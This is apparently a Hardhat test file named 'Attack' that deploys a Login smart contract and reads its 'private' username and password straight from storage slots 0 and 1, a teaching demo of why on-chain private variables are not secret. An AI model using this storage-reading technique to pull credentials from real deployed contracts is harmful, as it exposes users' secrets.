const { ethers, waffle } = require("hardhat");
const { expect } = require("chai");

describe("Attack", function () {
  it("Should be able to read the private variables password and username", async function () {
    // Deploy the login contract
    const Login = await ethers.getContractFactory("Login");
    // To save space, we would convert the string to bytes32 array
    let usernameBytes = ethers.utils.formatBytes32String("test");
    let passwordBytes = ethers.utils.formatBytes32String("password");
    const _login = await Login.deploy(usernameBytes, passwordBytes);
    await _login.deployed();

    console.log("Login contract address", _login.address);

    // Get the storage at storage slot 0,1
    const provider = waffle.provider;
    usernameBytes = await provider.getStorageAt(_login.address, 0);
    passwordBytes = await provider.getStorageAt(_login.address, 1);

    // We are able to extract the values of the private variables
    expect(ethers.utils.parseBytes32String(usernameBytes)).to.equal("test");
    expect(ethers.utils.parseBytes32String(passwordBytes)).to.equal("password");
  });
});
